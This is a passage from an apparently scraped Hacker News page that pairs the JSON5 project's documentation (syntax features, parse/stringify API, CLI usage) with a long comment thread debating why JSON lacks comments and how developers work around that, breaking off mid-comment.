    "originBody": "JSON5 JSON for Humans View the Project on GitHub json5/json5 JSON5 – JSON for Humans JSON5 is an extension to the popular JSON file format that aims to be easier to write and maintain by hand (e.g. for config files). It is not intended to be used for machine-to-machine communication. (Keep using JSON or other file formats for that. 🙂) JSON5 was started in 2012, and as of 2022, now gets >65M downloads/week, ranks in the top 0.1% of the most depended-upon packages on npm, and has been adopted by major projects like Chromium, Next.js, Babel, Retool, WebStorm, and more. It's also natively supported on Apple platforms like MacOS and iOS. Formally, the JSON5 Data Interchange Format is a superset of JSON (so valid JSON files will always be valid JSON5 files) that expands its syntax to include some productions from ECMAScript 5.1 (ES5). It's also a subset of ES5, so valid JSON5 files will always be valid ES5.* This JavaScript library is a reference implementation for JSON5 parsing and serialization, and is directly used in many of the popular projects mentioned above (where e.g. extreme performance isn't necessary), but others have created many other libraries across many other platforms. Summary of Features The following ECMAScript 5.1 features, which are not supported in JSON, have been extended to JSON5. Objects Object keys may be an ECMAScript 5.1 IdentifierName. Objects may have a single trailing comma. Arrays Arrays may have a single trailing comma. Strings Strings may be single quoted. Strings may span multiple lines by escaping new line characters. Strings may include character escapes. Numbers Numbers may be hexadecimal. Numbers may have a leading or trailing decimal point. Numbers may be IEEE 754 positive infinity, negative infinity, and NaN. Numbers may begin with an explicit plus sign. Comments Single and multi-line comments are allowed. White Space Additional white space characters are allowed. Example Kitchen-sink example: { // comments unquoted: 'and you can quote me on that', singleQuotes: 'I can use \"double quotes\" here', lineBreaks: \"Look, Mom! \\ No \\'s!\", hexadecimal: 0xdecaf, leadingDecimalPoint: .8675309, andTrailing: 8675309., positiveSign: +1, trailingComma: 'in objects', andIn: ['arrays',], \"backwardsCompatible\": \"with JSON\", } A more real-world example is this config file from the Chromium/Blink project. Specification For a detailed explanation of the JSON5 format, please read the official specification. Installation and Usage Node.js npm install json5 CommonJS const JSON5 = require('json5') Modules import JSON5 from 'json5' Browsers UMD Modulesimport JSON5 from 'https://unpkg.com/json5@2/dist/index.min.mjs' API The JSON5 API is compatible with the JSON API. JSON5.parse() Parses a JSON5 string, constructing the JavaScript value or object described by the string. An optional reviver function can be provided to perform a transformation on the resulting object before it is returned. Syntax JSON5.parse(text[, reviver]) Parameters text: The string to parse as JSON5. reviver: If a function, this prescribes how the value originally produced by parsing is transformed, before being returned. Return value The object corresponding to the given JSON5 text. JSON5.stringify() Converts a JavaScript value to a JSON5 string, optionally replacing values if a replacer function is specified, or optionally including only the specified properties if a replacer array is specified. Syntax JSON5.stringify(value[, replacer[, space]]) JSON5.stringify(value[, options]) Parameters value: The value to convert to a JSON5 string. replacer: A function that alters the behavior of the stringification process, or an array of String and Number objects that serve as a whitelist for selecting/filtering the properties of the value object to be included in the JSON5 string. If this value is null or not provided, all properties of the object are included in the resulting JSON5 string. space: A String or Number object that's used to insert white space into the output JSON5 string for readability purposes. If this is a Number, it indicates the number of space characters to use as white space; this number is capped at 10 (if it is greater, the value is just 10). Values less than 1 indicate that no space should be used. If this is a String, the string (or the first 10 characters of the string, if it's longer than that) is used as white space. If this parameter is not provided (or is null), no white space is used. If white space is used, trailing commas will be used in objects and arrays. options: An object with the following properties: replacer: Same as the replacer parameter. space: Same as the space parameter. quote: A String representing the quote character to use when serializing strings. Return value A JSON5 string representing the value. Node.js require() JSON5 files When using Node.js, you can require() JSON5 files by adding the following statement. require('json5/lib/register') Then you can load a JSON5 file with a Node.js require() statement. For example: const config = require('./config.json5') CLI Since JSON is more widely used than JSON5, this package includes a CLI for converting JSON5 to JSON and for validating the syntax of JSON5 documents. Installation npm install --global json5 Usage json5 [options]Ifis not provided, then STDIN is used. Options: -s, --space: The number of spaces to indent or t for tabs -o, --out-file [file]: Output to the specified file, otherwise STDOUT -v, --validate: Validate JSON5 but do not output JSON -V, --version: Output the version number -h, --help: Output usage information Contributing Development git clone https://github.com/json5/json5 cd json5 npm install When contributing code, please write relevant tests and run npm test and npm run lint before submitting pull requests. Please use an editor that supports EditorConfig. Issues To report bugs or request features regarding the JSON5 data format, please submit an issue to the official specification repository. Note that we will never add any features that make JSON5 incompatible with ES5; that compatibility is a fundamental premise of JSON5.* To report bugs or request features regarding this JavaScript implementation of JSON5, please submit an issue to this repository. Security Vulnerabilities and Disclosures To report a security vulnerability, please follow the follow the guidelines described in our security policy. ECMAScript Compatibility While JSON5 aims to be fully compatible with ES5, there is one exception where both JSON and JSON5 are not. Both JSON and JSON5 allow unescaped line and paragraph separator characters (U+2028 and U+2029) in strings, however ES5 does not. A proposal to allow these characters in strings was adopted into ES2019, making JSON and JSON5 fully compatible with ES2019. License MIT. See LICENSE.md for details. Credits Aseem Kishore founded this project. He wrote a blog post about the journey and lessons learned 10 years in. Michael Bolin independently arrived at and published some of these same ideas with awesome explanations and detail. Recommended reading: Suggested Improvements to JSON Douglas Crockford of course designed and built JSON, but his state machine diagrams on the JSON website, as cheesy as it may sound, gave us motivation and confidence that building a new parser to implement these ideas was within reach! The original implementation of JSON5 was also modeled directly off of Doug’s open-source json_parse.js parser. We’re grateful for that clean and well-documented code. Max Nanasy has been an early and prolific supporter, contributing multiple patches and ideas. Andrew Eisenberg contributed the original stringify method. Jordan Tucker has aligned JSON5 more closely with ES5, wrote the official JSON5 specification, completely rewrote the codebase from the ground up, and is actively maintaining this project. This project is maintained by json5 Hosted on GitHub Pages — Theme by orderedlist",
    "commentLink": "https://news.ycombinator.com/item?id=42360681",
    "commentBody": "JSON5 – JSON for Humans (json5.org)328 points by rickcarlino 21 hours agohidepastfavorite300 comments nikeee 20 hours agoI think it allows for too much. I was glad that JSON only supports double-quoted strings. It is a feature that removes discussions about which quotes to use. Or even whether to use quotes at all (we still need them for keys with colons or minus in it, so what gives?). The only thing that JSON is really missing are comments and trailing commas. I use JSONC for that. It's what VSC uses for the config format and it works. reply selcuka 17 hours agoparent> The only thing that JSON is really missing are comments and trailing commas. The reason JSON doesn't have comments [1]: I removed comments from JSON because I saw people were using them to hold parsing directives, a practice which would have destroyed interoperability. I know that the lack of comments makes some people sad, but it shouldn't. Suppose you are using JSON to keep configuration files, which you would like to annotate. Go ahead and insert all the comments you like. Then pipe it through JSMin before handing it to your JSON parser. [1] http://archive.today/8FWsA reply eviks 15 hours agorootparentThe reason never made much sense, anything can be abused, and the comment use case is easily way more important, and your suggestion doesn't help with eg syntax highlighting tools for your config that will treat comments as syntax errors, and also lose the ability to roundtrip, so your app can't edit user configs reply devjab 2 hours agorootparentI think the opinionated approach is what made json “win” the format battle more than anything else. If you’ve been around enterprise in the early 00’s you’ll know the horror that XML became when people weren’t using it in any sane manner. Which a lot of people simply weren’t, for whatever reason. Now this is anecdotal but over the decades I’ve never had issues parsing json, and I largely attribute its strictness to that. Yes I suppose you could abuse it, but I wouldn’t have to parse your nonsense, which couldn’t be said for XML. I don’t have anything against XML by the way, it was purely horrible to work with because people were using it in so many weird ways. Personally I prefer toml, but I guess we all have our preferences. reply int_19h 1 hour agorootparentWhat made JSON win was the ease of use from JS (= frontend). reply motorest 5 hours agorootparentprev> The reason never made much sense, anything can be abused (...) I don't think your take makes sense. Comments were purposely left out of JSON to mitigate the problem described by Hyrum's law. Smaller interface means a smaller surface to allow abuse. You're just arguing to facilitate abuse because you feel the abuse that was indeed avoided by leaving comments out is unavoidable, which is a self-contradiction. On top of that,think about the problem for a second. Why do you feel it's reasonable to support comments in data interchange formats? This use case literally means wasting bandwidth with data that clients should ignore. The only scenario where clients are not ignoring comments if exactly the scenario that it's being avoided: abusing it for control purposes. If you want a data interchange format to support that, you should really adopt something that is better suited for your whole use case. > and your suggestion doesn't help with eg syntax highlighting tools for your config that will treat comments as syntax errors (...) That's the whole point. This is by design, not a fault. Why are you pretending a language supports a feature it never supported and explicitly was designed to not support? reply eviks 4 hours agorootparent> Smaller interface means a smaller surface to allow abuse. If you take your law seriously, this is irrelevant because the surface of abuse is on the same scale of practical infinity, so it doesn't matter that one infinity is technically smaller. For example, based of the example in the quote: you could stick those directives from comments info #hashtags in stringy values, with the same effect that there is no interoperable way to parse values (or if you add \"_key_comment\" - there is no interoperable way to even parse keys as some of them need to be ignored) So the designer has achieved no benefit by removing a valuable feature > abuse that was indeed avoided Nothing was avoided, you can have the exact same abuse tucked into other elements > Why do you feel it's reasonable to support comments in data interchange formats? Why does the author of the quote sees the obvious which you don't see even after reading the quote? Go convince him his comment makes no sense because of \"data interchange\" Obviously it's not only used for data interchange in cases where every byte matters (reminder: this is a TEXT-based format) and also comments matter to humans working with this data > adopt something that is better suited for your whole use case. And this discussion is literally about a format supports that? But also, how does this in any way mitigate the flaws in the designer's arguments? > Why are you pretending a language supports a feature it never supported and explicitly was designed to not support? Same thing, why is the author of the quote makes this senseless suggestions then? Go convince him first reply motorest 2 hours agorootparent> If you take your law seriously, (...) Hyrum's law is not mine. It's a statement of fact that goes by that name already for a few decades and is noted by anyone who ever worked on production services that exposes an interface and is consumed by third parties. > (...) this is irrelevant because the surface of abuse is on the same scale of practical infinity, so it doesn't matter that one infinity is technically smaller. It really isn't. JSON does not support comments, thus they aren't abused in ways that sabotage interoperability. The only option you have is to support everything at the document schema level. You can't go around it. > For example, based of the example in the quote: you could stick those directives from comments info #hashtags in stringy values, (...) Irrelevant. You're specifying your own schema, not relying in out-of-band information. That's exactly how a data interchange format is designed to be used. There is no way around it. If you understand the problem domain, the fact that leaving out comments is an elegant solution to a whole class of problems is something that's immediately obvious to you. reply cogman10 1 hour agorootparentThe arguments presented here would also lead someone to not use JSON for data interchange. If specifying the schema is important then why not an interchange format with strict schema enforcement like XML? If minimal feature sets to avoid abuse are so important, then why not a binary format like protobufs which also have strict schema dictates? And if interoperability is important then why not ditch REST/JSON all together and instead favor SOAP which strictly defines how interoperability works? That's why I don't buy the \"comments might be abused\" argument. JSON doesn't have a single problem domain and it's not the only solution in town. reply dwaite 13 hours agorootparentprevIt is more that people made comments semantically important, e.g. a tool which did not interpret comments would not correctly interpret the data in the document. This actually would put JSON in a worse place than XML - while XML has an overly complex infoset, that infoset is actually defined and standardized. Representing \"a property with a comment on the property name and one before and after the property value\" so that information is not lost in parsing would explode the complexity needed for an \"interoperable\" JSON library. if someone wants to create some sort of scheme where they do \"createdAt$date\" as a property name to indicate the value is to be interpreted in some agreed-upon date format, that at least doesn't lose data if the JSON data doesn't understand that scheme, or require a new custom parser in order to properly interpret that data, compared to something like /* $type: date */ \"createdAt\" :... reply eviks 12 hours agorootparentwhy would you need that complex representation in the interoperable library instead of a much simpler one: a property, a comment, a comment, a value, a comment, ...? This doesn't explode anything and you don't need to lose any data, so the monstrosity of XML still has no benefit, and neither does \"createdAt$date\", which would need a custom library anyway, so it doesn't matter where you insert your types reply _heimdall 7 hours agorootparentXML may have no benefit to you but it absolutely has benefit. A bit off topic when the only consideration here is comments, but XML allows for type definitions and structures data that simply isn't possible in JSON. People have found ways to attempt to add types to JSON but they aren't part of the spec at all and are just convention-based solutions. reply hnben 8 hours agorootparentprevI don't understand the problem. But I do understand the desire to keep the json definition simple and concise. If you need additional fields in the json to hold comments, why not add the fields however you want? And if you need meta-data for the parser, you could add it the same way. In a project, i am working on right now, we simply use a attribute called \"comment\", for comments. e.g. use \"_\" as a prefix to mark comments, and then tell you applications to ignore these attributes. { \"mystring\": \"string123\", \"_mystring\": \"i am a comment for mystring\", \"mynum\": 123, \"_mynum\": \"i am a comment for mynum\", \"comment\": \"i am a comment for the entire object\" } reply adamc 4 hours agorootparentThat solution is clearly weirder and more complex to understand than the comments it replaces. You impose semantic burden while demonstrating that the \"abuse\" of comments cannot really be prevented. reply _heimdall 7 hours agorootparentprevThe challenge there is that the solution is convention rather than spec. Comments would only be understood by parsers that follow, or at least support, that convention and all other parsers would treat the data differently. That may not be a huge problem for you, you see the \"comment\" key and know its just a comment and can ignore when a parser treats it like a normal string field. It could be an issue though, for example I could see any code that runs logic against all keys in the object becoming harder to maintain. reply eviks 7 hours agorootparentprevAdding comments doesn't contradict \"simple and concise\" as it doesn't add much, but on the contrary allows avoiding verbose solutions (repeating names) (but also now you need to do string escaping inside a comment???) such as the one you suggest, which will also not have custom syntax highlighting since it's not part of the spec and have a bunch of other issues (like, now you don't know how many keys you have without parsing every key name to exclude comments) > If you need additional fields in the json to hold comments I don't need additonal fields, I need comments > why not add the fields however you want Because I can't do that either, there are noticeable limitations reply Thom2000 4 hours agorootparentprev\"comment\" may be relevant to the object. Maybe using \"_\" for the whole object comment would be safer? reply oneeyedpigeon 3 hours agorootparentIt would also be consistent (everything beginning with a \"_\" is a comment) reply F7F7F7 5 hours agorootparentprevThis is about interoperability and integrations. Which relies on some sense of predictability. Syntax errors and erroneous highlighting are not even item 10000 on my list of JSON concerns. Dare I pull a tired cliche and say “you’re using it wrong” reply PhilipRoman 11 hours agorootparentprev>and also lose the ability to roundtrip, so your app can't edit user configs I think roundtrip with comments is not feasible in general. Most code just expects a hashmap, which it edits and then serializes back. You would need some really clever handling for comments to do it. reply eviks 10 hours agorootparentWe're in luck: clever people exist and have written libraries that do the clever handling for us and support roundtripping comments! reply throwaway290 10 hours agorootparentWhich works at performance cost and only until it breaks... reply eviks 10 hours agorootparentLack of roundtrip means it's already broken and loses data, so upgrading to just the potential of a break is a marked improvement worth paying for reply throwaway290 9 hours agorootparentCan't lose data which you don't have and in this case there are no comments in json! reply eviks 9 hours agorootparentIf you close your eyes, the data doesn't disappear! Of course you have the data, it's in the comments, and the original comment explains how it got there reply throwaway290 8 hours agorootparentIf someone classifies comments as data then I'd say someone needs to upgrade data architecture chops Yes the comment free spec forces to normalize what would be comments into data spec and it is frustrating to put more effort into things reply Brian_K_White 14 hours agorootparentprevThis. You can make special key names that are really directions for something. You can make enrire k v pairs that are never used by anything that actually parses the json normally. Argument was invalid as far as I can see and calling it \"sorry it makes you sad\" is, wow I don't even know where to begin with that. Having annotation happen in a dedicated place designed for it is better than having it happen where it was not designed to be, end of math problem. reply hombre_fatal 3 hours agorootparentPeople keep bringing it up that \"anything can be abused\" but the point is that if you want to abuse something, abuse the simple parseable data rather than comments in the syntax tree. Your two examples are just two examples of why we don't need comments for data interchange: yes, you put the data in a trivial, stable position in the parsed data that all parsers can parse rather than write some sort of DSL that has to be extracted from comment nodes that may appear in various places in the tree. Turning this: { \"key\": \"value\" /* directive */ } Into this: { \"key\": { \"value\": \"value\", \"info\": \"directive\" } } Is the whole point. The more \"abusive\" you imagine the contents of \"directive\" to be, the more reason it should exist as the latter data, not more reason we should accept the former. reply Brian_K_White 1 hour agorootparentThe whole point is you can't just add your own new keys/values/fields. Most json users are not writing all of the software that both generates and consumes the json. reply throwaway290 10 hours agorootparentprevYou are saying as if there was an apology or it should be needed for some reason. For any spec there are people who want something spec doesn't do and people writing the spec need to say no to requests that they consider not in scope as much or more often than they say yes reply Brian_K_White 1 hour agorootparentThere was literally an apology, a douchebag backhanded false one, but still acknowledged explicitly that there was a thing he knew everyone would want, and knew it would \"make some people sad\". Comments are not some weird thing one person wants for their weird reason that no one else needs to care about. It's like leaving out a letter from the alphabet. reply thwarted 1 hour agorootparentprevAbuse of comments is not an academic, theoretical consideration. https://www2.jwz.org/doc/cddb.html (Unfortunately, because jwz blocks HN referrals, you can't click on this link, but will need to copy it into the address bar) reply hansvm 14 hours agorootparentprevThat doesn't make it a good reason. People are placing those directives into json docs anyway, but instead they're relying on nobody causing a namespace collision with their special key whos associated value has the directives of interest. reply gregoriol 5 hours agorootparentprevSo instead of comments with parsing directives, people use underscore prefixed keys to keep metadata and comments, that's not a win at all reply arp242 5 hours agorootparentThe thing is that JSON was intended to be a data exchange format, not a configuration file format or anything else. IMHO Crockford's reasoning makes a lot more sense with that in mind. reply gregoriol 4 hours agorootparentEven if we stick to the data exchange format, it would be practical to have comments in examples of data. This would be good for training and learning, for documentation. reply arp242 4 hours agorootparentObviously it's useful in many cases; designing anything like this is an exercise in trade-offs. reply layer8 3 hours agorootparentprevXML was intended as a data exchange format and has comments. Image file formats like JPEG and PNG support comments (and so does SVG by virtue of being XML). Database systems support comments on database objects. It’s really not a convincing argument. reply JambalayaJimbo 5 hours agorootparentprevData interchange formats are often used for configuration. It makes sense to have a single source of truth in json if your configuration is consumed by an app. reply motorest 5 hours agorootparentprev> So instead of comments with parsing directives, people use underscore prefixed keys to keep metadata and comments, that's not a win at all Your comment doesn't make any sense. You're just pointing out that developers designed data interchange formats as subsets of JSON which explicitly support metadata and comments. This means they are specifying their schemas to support these usecases in a way clients can and do support it. That, if anything, proves right the decision to not support comments because it resulted in better-defined and well-behaving clients. reply gregoriol 4 hours agorootparentComments could be skipped by parsers, instead parsers need to parse and store those keys/values that are not relevant. This is not called efficient. reply hn_throwaway_99 15 hours agorootparentprevFWIW, I'm well aware of Crockford's rationale, I think it's some of the dumbest rationalization I've heard, and time has shown that it was a giant mistake. Trying to prevent programmers from doing something \"because they may 'misuse' comments\" is asinine to the extreme. This is not like removing a footgun, it's trying to dictate how you think programming should be done. This is particularly hilarious because I've instead seen tons of horribly hacky workarounds for JSON's lack of comments, e.g. \"fake\" object entries like \"__previousKey_comment\": \"this is a comment for previous key\", or even worse, putting two entries with the same key since the second key should \"win\", and thus making the first entry the comment. As for his second point, \"Suppose you are using JSON to keep configuration files, which you would like to annotate. Go ahead and insert all the comments you like. Then pipe it through JSMin before handing it to your JSON parser.\" - just look at the everlasting shit show that is package.json since it can't support comments, because lots of NPM tools actually write to package.json, so there is no guarantee that other tools will be able to read package.json if it includes comments. I think the thing that I hate most about Crockford's rationalization of not having comments is that you have to have your head stuck 10 feet in the sand to pretend that somehow the lack of comments is a good thing with the benefit of hindsight. I guess I could understand if Crockford's position was \"Yeah, originally I thought it was better to keep them out because I was concerned about misuse, but now in retrospect to see the much larger problems it causes, and I realize it was a mistake.\" But instead he just keeps pushing his original crappy opinion on this topic. reply justmedep 15 hours agorootparentI usually just add my comment as an additional field called _comment or something like that reply efitz 14 hours agorootparentI have encountered many systems that explicitly disallow “unexpected” JSON elements and such an approach would fail. This is particularly common when using JSON around API-like use cases. reply hn_throwaway_99 14 hours agorootparentprevExactly, and that's a crappier workaround. E.g. in lots of places you can't just have willy-nilly, anything-goes key names. An example I think every Node developer can commiserate with is that there isn't really a great way to add comments in the dependencies or devDependencies section in package.json, because those keys need to refer to module names, and that's where I most often want to use comments in package.json. I won't rehash all the details but just take a look at https://stackoverflow.com/questions/14221579/how-do-i-add-co... . Unfortunately none of the answers there are very good. In the past I've resorted to doing what https://stackoverflow.com/a/45815391/1075909 does, but that ends up not working very well once you've got a long list of dependencies, because the comment for any particular dependency ends up being far from the entry that specifies the dependency (instead of the line above), so people end up not reading it or forget to update it if that becomes necessary. Yeah, I really, really hate that JSON doesn't have comments :) reply thayne 12 hours agorootparentprevSo how do you add a comment in the middle of an array? reply CharlieDigital 2 hours agorootparentThese two are not remotely the same thing. You can have an array declared on multiple lines and add a comment to specific values. Or even inline with the value /* */. reply oneeyedpigeon 4 hours agorootparentprevHow do you add a comment in the middle of a keyword in JavaScript? reply jefftk 3 hours agorootparentI often want to comment individual array values to give more context or describe provenance. I don't think I've ever wanted to add a comment in the middle of a keyword. reply milch 15 hours agorootparentprevI've also seen parser directives inserted into the keys like `{ \"fooBar__datetime\": 123456780.0 }`, and many other creative workarounds reply mmis1000 13 hours agorootparentActually there is a common practice that java or js library used to serialize typed data. They just preserve the key starts with $ for special use So a class A with a double and and an int field will be something like { \"$type\": \"A\" \"value\":{ \"a\": { \"$type\": \"double\", \"value\": 1 }, \"b\": { \"$type\": \"int\", \"value\": 2 } } } And what about keys that actually starts with $? You just escape it with special $raw key \"$raw\": { \"$escaped\": { \"$type\": \"double\", \"value\" 1 } } It's a bit way too verbose. But given it is just a serialization format inside some library or app, it won't cause too much problems. reply 6510 10 hours agorootparentprevI one time by sort of accident coined a config format by parsing todo.txt It was so useful it stuck around for much longer than I had intended to. Rather than comment out stuff it just looks for \"=\" and ignores everything else. conf = {}; configFile.split('').forEach( function(x){ y = x.split(' '); if(y[1]==\"=\") conf[y[0]] = y[2]; }); Everything is a comment with exception of lines like: speed = 100 km/h weight = 60 kg maxBuffer = 200 chars (between 100 and 300 works best) output: {\"speed\":100,\"weight\":60,\"maxBuffer\":200} It had walls of text with headings and something configurable sprinkled in. Crockford would be screaming. lol reply selcuka 7 hours agorootparentReminds me of Whitespace [1] where anything but a whitespace is a comment. [1] https://en.wikipedia.org/wiki/Whitespace_(programming_langua... reply leptons 13 hours agorootparentprevWhen I think of how often and where JSON is used, as a data interchange format for APIs, in the browser, databases, and everywhere else - all the billions of bytes transferred in JSON every second - in all those use cases comments would be pointless and counterproductive and just take up storage space or bandwidth. That's JSON's primary use case in the world. It's only in the very few use cases specifically for programmers where comments would sort of be helpful in JSON, and most of those cases are not really that important to support when there are workarounds - structure your JSON well and you can include the comments as part of the JSON, and then you can even use the comments programmatically should that be useful (which I think is slightly more useful than storing knowledge in a JSON file as a comment). >Trying to prevent programmers from doing something \"because they may 'misuse' comments\" is asinine to the extreme. Programmers are often their own worst enemies. Some prefer rigid rulesets over less rigid freeform programming. See Typescript vs Javascript. No comments in JSON is just another example of over-rigidification, and some programmers love that. >package.json since it can't support comments, If you're needing to write comments in package.json, maybe you're not approaching package.json correctly? It's really for node things, not your things that you need to write comments about. I'm not even sure why someone would want to write comments in package.json. I get it with comments in other JSON files, but package.json probably should be left for nodejs things. reply hn_throwaway_99 12 hours agorootparentIt's hard for me to find a comment where I disagree with literally every sentence, but congrats! 1. So what if JSON is primarily used for data interchange? It's not like allowing comments would somehow make them magically show up on serialized objects. This objection makes 0 sense to me. And heck, tons of other serialization formats (e.g. XML) support comments. Besides, there is a big reason that human-readable serialization formats are so popular - because they're human readable! If you're really worried about size you should be using a binary format anyway. 2. \"Rigid rulesets\" has nothing to do with Crockford's arguments. It's one thing to prefer a particular type system, or limit functionality if you think it has high potential for misuse. By JSON not having comments all you end up with is worse workarounds, like putting comments in object keys. 3. \"I'm not even sure why someone would want to write comments in package.json\" To be blunt, then, I can't believe you've ever written any code in a business (i.e. with multiple developers) in the Node/NPM ecosystem. Is it really that hard to wonder why someone would want to comment why they added a particular dependency to their project? The lack of comments in package.json is one of the biggest complaints of this format, and it's certainly not just me, e.g. https://github.com/npm/npm/issues/4482 and https://stackoverflow.com/questions/14221579/how-do-i-add-co... reply oneeyedpigeon 4 hours agorootparent> comment why they added a particular dependency to their project Surely that's what the commit message is for? I mean, I get that it's more convenient to have the comment right there in the file, but that should be balanced against the downsides: having to maintain the comment, making the file larger and more awkward to read, etc. reply hn_throwaway_99 3 minutes agorootparentYour rationale could apply to all comments in general. Hey, just have folks scour through the commit messages instead! Yes, I still think a commit message is important, but it absolutely does not take the place of a comment. Suppose you'd like to do something like this: // DO NOT change to latest version. MUST pin to version 1.2.3 because // 1.2.4 includes a subtle bug that doesn't work with our version of // the zed library. We have an open issue on zed, see // https://github.com/zed/zed/issues/1234. // Once that is fixed, we can upgrade. \"foobar\": \"1.2.3\" There is zero chance that comment is going to be seen if its just in a commit message, furthermore you should never depend on git blame showing a particular comment because it's easy for later commits to overwrite it due to simple things like formatting changes, etc. Yes, in that example case there should be tests too, but IMO the primary purpose for comments is to highlight issues and concerns that aren't immediately apparent just by reading the code. I simply cannot think of another file format that is used for configs that doesn't support comments. kriz9 10 hours agorootparentprev3. So when that dependency gets removed by npm uninstall how should that comment be handled? You know that in business we just would end up with a bunch of dead comments in the package.json - is that really a better alternative than just using Ctrl+f to find where the dependency is used? reply leptons 10 hours agorootparentprev>The lack of comments in package.json is one of the biggest complaints of this format, and it's certainly not just me Well then you and plenty of other people have some wrong ideas about package.json. That isn't surprising. package.json gets rewritten for all kinds of things, which is not really compatible with adding comments wherever you want. Adding \"why this dependency is here\" comments may seem like a good idea to add to package.json, but you're kind of missing the point. If you need that level of documentation, trying to shoehorn it into package.json is just the wrong place for it. Soon enough your package.json looks like a graffiti wall. >To be blunt, then, I can't believe you've ever written any code in a business (i.e. with multiple developers) in the Node/NPM ecosystem. Then you'll be astonished that I have been working with nodejs for about 14 years professionally. Sure I have wanted to put comments into package.json, but I was naive and now I'm fine not doing that. I haven't wanted to in many years. I document things in other ways and it has served us all very well. YMMV. reply dngit 9 hours agorootparent> if you need that level of documentation, trying to shoehorn it into package.json is just the wrong place for it. Soon enough your package.json looks like a graffiti wall. So the right place is to make a graffiti out of another place, instead of in the place where people actually declare the dependencies? I find it bizarre when people believe in one true way of doing things. I mean, you can declare your dependencies how you like, but if others do it differently, then they're clueless? reply leptons 20 minutes agorootparentYou're clueless if you think adding comments to package.json - a file that regularly gets rewritten - is anything but an exercise in futility. Any time you run \"npm install [whatever]\" you are rewriting package.json. How exactly do you expect to maintain your random comments in this case? You expect nodejs to understand how comments are being written in package.json and not mess that up? You don't seem to understand how npm or package.json works. reply arkh 9 hours agorootparentprev> but I was naive and now I'm fine not doing that Either https://en.wikipedia.org/wiki/Learned_helplessness or https://en.wikipedia.org/wiki/Normalization_of_deviance reply mp05 15 hours agorootparentprev@fat is that you? reply hn_throwaway_99 14 hours agorootparentDid you just call me fat ;) I don't know who @fat is, but if he thinks Crockford's rationalization for the lack of comments in JSON is total and complete BS, I like the way he thinks. reply mp05 13 hours agorootparenthttps://news.ycombinator.com/item?id=3842713 Not sure why all the downvotes? Thought this was a classic. reply oneeyedpigeon 4 hours agorootparentprevI just took a look at an example package.json file and it seemed fine — no 'comments' shoehorned in anywhere, meaningful key names that reduced the need for comments. Do you have an example of a package.json file that would be better if json supported comments? reply Uvix 3 hours agorootparentI don't have an example file on hand, but they would be useful for documenting non-explicit dependencies between packages. e.g. Kendo UI and the corresponding theme packages[1] - neither NPM package depends on the other, but if there's a comment then when seeing a change to one, the developer or a reviewer should know to double-check the other. [1] https://docs.telerik.com/kendo-ui/styles-and-layout/sass-ver... reply webstrand 2 hours agorootparentprevWell not offhand, comments aren't supported so workarounds are used instead. But I would find it very convenient if I could leave comments on dependencies and scripts. Or even various engine requirements. Sure you can write everything in another file or put the comments in the commit message. But out-of-band comments are more easily missed or lost. If the package.json got rewritten by `npm install` you'd lose the comments. Inconvenient, but that's trivial to fix at commit time. reply adamc 4 hours agorootparentprevOne way to bifurcate the world is that there are people who tend to restrict options to prevent misuse vs. people who tend to enable options to the positive uses easier. I fall in the latter camp. Preventing errors by restricting options also prevents positive uses that make life better. We get to choose what approach we take. I prefer the \"give them the rope they might need\" philosophy. If they hang themselves, oh well. reply pbreit 2 hours agorootparentprevIt might be abused and you can just pipe it through a preprocessor are not very good reasons. reply Zamicol 12 hours agorootparentprevSoftware developers very much so care about best practices. All that needed to be said was, \"Using comment programmatically is bad practice. Don't do it.\" reply nurettin 14 hours agorootparentprevWe should call this \"The Crockford Fallacy\". Destroying something valuable in fear of a perceived threat. reply AnthonBerg 11 hours agorootparentWe should preemptively destroy the concept of the Crockford Fallacy because people might seek to emulate it, right? reply nurettin 7 hours agorootparentYou can destroy the concept, but people will reconstruct it from the ironic remains. reply fuzzythinker 14 hours agorootparentprevThat's a terrible reasoning for requiring an extra toolchain. reply naikrovek 6 hours agorootparentprev> I removed comments from JSON because I saw people were using them to hold parsing directives there's always someone putting actual logic in comments, and when I rule the world, those people are all going to be put on an island by themselves and they're going to have to deal with each other. reply SV_BubbleTime 15 hours agorootparentprevAnd that is fine reasoning, the workaround is not for me… but the larger issue is an inventor kneecapping something by stating how you should use it. It’s not like there isn’t another side to this argument. reply KPGv2 14 hours agorootparent> the larger issue is an inventor kneecapping something by stating how you should use it This isn't kneecapping something any more than an inventor requiring programmers in a new language use types, or not use types, whichever the inventor deems preferable. He invented a thing. He declared how the thing is constructed. That's not kneecapping. That's just defining a thing. reply Brian_K_White 13 hours agorootparentIt is kneecapped. He invented a thing and left out a well known and understood core function required in the problem space, deliberately, not through oversight. That's what makes it kneecapping. The whole useful thing, ie the idea of a data format, including both knees (ie all the basic features any such thing needs) was there. The concept and necessity of annotation was a well known thing by then, and indeed he knew of it himself too, said so himself, and actively removed one functioning knee from that whole, to produce only the kneecapped thing. He defined a kneecapped thing. Or he kneecapped the design. Whichever way you want to say it. The difference would be if it was 40 years earlier and you are taking the fist stab at designing any kind of data format and comments just never occurred to you yet. This is more like making a new programming language and deciding that it shall not have one of the basic math operators. If you need to multiply, tough shit, do it some other way. Just pipe it through JSMulti. reply nigeltao 19 hours agoparentprevJWCC literally stands for JSON With Commas and Comments. JWCC is also what Tailscale call HuJSON, as in \"JSON for Humans\", which as amusingly also what json5 claims to be. https://github.com/tailscale/hujson reply lioeters 14 hours agorootparentThere's also HJSON, which stands for Human JSON. https://hjson.github.io/ It has implementations in JavaScript, C#, C++, Go, Java, Lua, PHP, Python, Rust. reply joshuaturner 13 hours agorootparentWho has the xkcd comic about standards handy? reply 404mm 18 hours agoparentprevExactly! Trailing commas (for cleaner commits) and comments are the only pain points I ever felt. On the other hand: > leadingDecimalPoint: .8675309 This is just lazy. Can we discuss in depth how much time you saved by skipping the “0” in favor of lesser readability? > andTrailing: 8675309., This doesn’t mean anything to me. reply crazygringo 1 hour agorootparentIt has nothing to do with laziness in typing. It's just not wanting to keep track of more rules. If you've only ever used languages where a leading decimal point is allowed, it's a pain point to suddenly have to remember that it isn't here, and for no obviously intuitive reason. It's about wanting to avoid unnecessary conceptual friction. Not lazy keyboard usage. (Heck, your second example uses an extra keystroke. And it's perfectly readable to me, based on the languages I use.) reply efitz 14 hours agorootparentprevIt’s not about readability, it’s being realistic about other humans and making software robust in the presence of common, trivial, unambiguous “errors”. Reference: Postel’s Law https://www.laws-of-software.com/laws/postel/ reply int_19h 1 hour agorootparentPostel's Law was a bad idea. https://datatracker.ietf.org/doc/html/draft-thomson-postel-w... reply cwmoore 55 minutes agorootparent'\"bug for bug\" compatible' reply wvh 5 hours agorootparentprevArguably, if there's ambivalence about numbers or other core structures or doubt about the intent, the 